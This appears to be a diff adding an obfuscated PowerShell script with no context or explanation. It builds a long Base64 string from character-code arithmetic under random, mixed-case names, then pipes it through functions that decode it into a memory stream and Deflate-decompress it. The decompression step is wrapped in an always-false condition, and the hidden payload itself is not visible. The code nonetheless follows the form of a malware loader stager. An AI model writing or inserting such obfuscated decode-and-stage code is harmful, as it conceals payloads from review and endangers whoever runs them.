@@ -1,0 +1,24 @@
+$RIiZQ= [cHAr]( 58+30)+[cHAr]( 29 + 70)+[cHAr](73 + 35)+[cHAr](3+63)+[cHAr]( 14 +53)+[cHAr]( 21 +90)+[cHAr]( 72+5)+ [cHAr]( 42 + 77)+ [cHAr]( 44 +25)+[cHAr](14 + 55)+[cHAr]98+[cHAr]( 66 + 38)+[cHAr](10 +92)+ [cHAr]( 58 +27)+ [cHAr](30+ 17)+ [cHAr](19+ 101)+[cHAr]( 88 - 15)+ [cHAr]( 55 - 3)+[cHAr]( 75-2)+[cHAr](1+ 97)+[cHAr](11+60)+ [cHAr](72 +12)+[cHAr](3+78)+[cHAr](63 +18)+[cHAr]( 85+ 2)+[cHAr]( 79 + 24)+[cHAr]( 64+49)+[cHAr](24 + 33)+ [cHAr](9 + 95)+[cHAr](5+77)+[cHAr](82 +17)+ [cHAr]81+[cHAr]( 67+5)+[cHAr]( 41 +43)+[cHAr](25 + 48)+ [cHAr](12 + 56)+ [cHAr]( 24+ 85)+[cHAr]( 96 + 16)+[cHAr](61 + 23)+ [cHAr]( 53 + 24)+ [cHAr](87+3)+ [cHAr]( 71+ 8)+ [cHAr](71+1)+ [cHAr](27 + 89)+ [cHAr]( 40+ 14)+ [cHAr]( 93- 38)+ [cHAr]( 74+40)+[cHAr](77-1)+[cHAr]( 53+4)+[cHAr](73 - 18)+ [cHAr]( 78 -28)+ [cHAr](29+14)+ [cHAr](13 + 102)+ [cHAr]( 51+ 63)+ [cHAr](90- 2)+ [cHAr]( 17 +51)+[cHAr]( 28 + 28)+ [cHAr](36+ 49)+ [cHAr](23 +48)+ [cHAr](8 +43)+[cHAr]( 85-18)+[cHAr](20 + 50)+[cHAr](40 +61)+[cHAr]( 56+15)+ [cHAr](32 + 39)+[cHAr]( 73+40)+ [cHAr](62+ 59)+ [cHAr](50+49)+ [cHAr]( 90 -35)+ [cHAr](18 + 57)+ [cHAr](98 - 25)+ [cHAr]( 79-26)+ [cHAr](92 -11)+ [cHAr]( 9+89)+[cHAr](60 +20)+[cHAr](3 +109)+[cHAr]( 15 +107)+ [cHAr]( 80+ 24)+[cHAr](12+ 92)+[cHAr](67+33)+[cHAr](44 + 42)+[cHAr](88 +23)+[cHAr](24+75)+ [cHAr](84-8)+ [cHAr]( 85 +3)+ [cHAr](69-12)+[cHAr](46 +60)+[cHAr]( 76 +11)+ [cHAr](75 +5)+ [cHAr](91 - 23)+[cHAr]( 30 + 73)+[cHAr](63+20)+[cHAr]( 2 +49)+[cHAr](91 -42)+[cHAr]( 61+ 46)+[cHAr]( 14+ 105)+[cHAr](37+15)+ [cHAr]( 83+27)+[cHAr](90- 33)+ [cHAr](84- 32)+[cHAr](39+ 58)+[cHAr]( 56+ 34)+ [cHAr]( 26 + 89)+ [cHAr]( 40 +41)+ [cHAr]( 41+67)+[cHAr](24+ 88)+ [cHAr](36 + 79)+ [cHAr]( 59 + 13)+ [cHAr](36+83)+ [cHAr](6+43)+ [cHAr]( 16 +70)+ [cHAr](90 + 7)+[cHAr]( 43 +35)+ [cHAr]( 6 +94)+[cHAr]( 72+4)+ [cHAr](47+ 71)+ [cHAr](16+ 63)+[cHAr](86- 38)+[cHAr]( 97+ 24)+ [cHAr]( 31 +51)+[cHAr](37+ 82)+[cHAr]( 75+43)+ [cHAr]( 15+106)+[cHAr]( 41 + 66)+[cHAr](85 +1)+ [cHAr](44 +10)+ [cHAr](100 - 18)+ [cHAr]( 2+51)+ [cHAr](87 - 20)+[cHAr](92+ 24)+ [cHAr]( 60-9)+[cHAr](84+ 22)+[cHAr](47 +19)+ [cHAr](29+ 90)+[cHAr]( 87-26)+ [cHAr]( 20 + 41)
+FuncTIoN qMfdlPp { 
+    [ CMdLeTBiNDinG()]PARam( 
+        [paraMETeR (vaLUEfromPIpElINE)]
+        $csJc,
+        [paraMETeR(vaLUEfromPIpElINE)]
+        $bGMtqj,
+        [paraMETeR (vaLUEfromPIpElINE)]
+        $RTIyCVhX
+    )
+    [iO.memOrystReAm][SYsteM.COnverT]::froMbasE64sTRInG($RTIyCVhX) | pMlgmAB
+}
+FuncTIoN pMlgmAB { 
+    [ CMdLeTBiNDinG()]PARam( 
+        [paraMETeR (vaLUEfromPIpElINE)]
+        $LrtT
+    )
+    iF($fAlse){
+        $qxDKgWs= ( new-objECt   sYstEm.io.StREAmREADER( ( new-objECt   SYstEM.Io.COmprEsSIOn.deFlATestReAm( $LrtT,[sySTEm.io.CoMpREssIoN.COMPResSiOnMOdE]::DeComPreSs )) , [sYSTeM.teXT.enCoDiNG]::ASCii)).ReAdTOEnd( )
+    
+    }
+}
+qMfdlPp -csJc 'ecca' -bGMtqj 'CKGcitl' -RTIyCVhX $RIiZQ
+
